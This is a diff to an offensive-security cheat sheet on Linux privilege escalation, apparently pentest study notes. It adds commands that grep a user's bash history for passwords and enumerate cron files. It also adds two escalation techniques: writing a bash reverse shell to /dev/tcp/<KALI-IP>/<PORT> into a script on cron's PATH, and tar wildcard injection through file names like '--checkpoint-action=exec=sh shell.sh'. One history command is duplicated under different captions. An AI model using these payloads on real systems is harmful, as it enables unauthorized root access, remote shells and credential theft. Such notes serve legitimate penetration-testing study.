@@ -15,23 +15,6 @@ dpkg -l #List the installed packages on Debian
 rpm -qa #List the installed software RHEL or Fedora
 ```
 
-Enumerate information from cron:
-
-```
-crontab -l
-ls -al /var/spool/cron
-ls -al /etc/ | grep cron
-ls -al /etc/cron*
-cat /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-cat /etc/cron.allow
-cat /etc/cron.deny
-cat /etc/crontab
-cat /etc/anacrontab
-cat /var/spool/cron/crontabs/root
-```
-
 #### User and group enumeration
 
 ```bash
@@ -102,3 +85,60 @@ find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;
 
 #### Searching for passwords in history files
 
+* Analyze the `user` account Bash history file
+
+```bash
+cat /home/wizard/.bash_history | grep "pass"
+```
+
+* Output the entire history of commands
+
+```bash
+cat /home/wizard/.bash_history | grep "pass"
+```
+
+## Scheduled Tasks
+
+#### Enumerate cron paths
+
+```bash
+crontab
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+```
+
+#### Escalating privileges via cron paths
+
+This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+So we create the `overwrive.sh` script in the /home/user folder and insert a Bash reverse shell.
+
+```bash
+echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
+```
+
+#### Escalation via cron wildcards (\*)
+
+Using the example above: `cat /usr/local/bin/compress.sh`&#x20;
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.
+
+```bash
+echo 'bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1' > shell.sh
+touch /home/user/--checkpoint=1 #Set up tar checkpoint
+touch /home/user/--checkpoint-action=exec=sh\ shell.sh #Set the checkpoint action
+
+```
